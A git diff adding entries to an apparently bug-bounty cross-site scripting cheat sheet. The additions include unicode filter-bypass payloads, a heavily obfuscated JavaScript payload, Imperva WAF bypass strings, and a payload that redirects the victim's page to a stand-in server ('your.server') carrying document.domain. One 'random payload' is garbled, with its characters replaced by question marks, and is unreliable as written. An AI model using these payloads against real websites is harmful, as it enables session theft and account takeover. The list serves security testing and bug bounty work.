@@ -346,7 +346,12 @@ javascript://%250Aalert(1)
 ```html
 "><a/href="'j'a'v'a'sc'r'ip't':'alert(d'ocumen't.domain)"/>
 ```
-
+11. Filter Bypass via unicode
+```
+%u003Csvg onload=alert(1)>
+%u3008svg onload=alert(2)> 
+%uFF1Csvg onload=alert(3)>
+```
 ## JS Context
 
 1. function Name() {document.location.href = "test.aspx?id="<PAYLOAD>";}
@@ -361,7 +366,10 @@ javascript://%250Aalert(1)
   ```
    - XSS lead to admintakeover
      ![POC](https://pbs.twimg.com/media/EUHdw3hXkAEO7ra?format=png&name=900x900)
-   - 
+   - A cuneiform payload by @lutfumertceylan
+      ```html
+      𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++], 𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀] +(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀] +𒀟]𒁹()
+      ```
     
  ## Blind XSS
     
@@ -382,7 +390,9 @@ javascript://%250Aalert(1)
 <svg onx=() onload=(confirm)(1)>
 
 <svg onx=() onload=(confirm)(document.cookie)>
-
+    
+<svg/onload=location/**/='https://your.server/'+document.domain>
+    
 <svg onx=() onload=(confirm)(JSON.stringify(localStorage))>
 
 Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
@@ -407,6 +417,8 @@ Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
 
 <svg/onrandom=random onload=confirm(1)>
 
+%2sscript%2ualert()%2s/script%2u
+    
 <video onnull=null onmouseover=confirm(1)>
 
 <a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus>
@@ -415,6 +427,17 @@ Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
 
 <img ignored=() src=x onerror=prompt(1)>
 ```
+2. Imperva WAF bypass payload 
+```
+ <x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme
 
-Reference:
-- https://github.com/Auxirie/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0]v+a+e+s(/infected/.source)" />click
+ ```
+
+## Random Payload
+   - `<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>`
+   - ?=”,?=!?+?,?=!?+?,?=?+{},?=?[?++],
+?=?[?=?],?=++?+?,?=?[?+?],?[?+=?[?] +(?.?+?)[?]+?[?]+?+?+?[?]+?+?+?[?] +?][?](?[?]+?[?]+?[?]+?+?+”(?)”)()
+   - 
+## Reference:
+   - https://github.com/Auxirie/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md
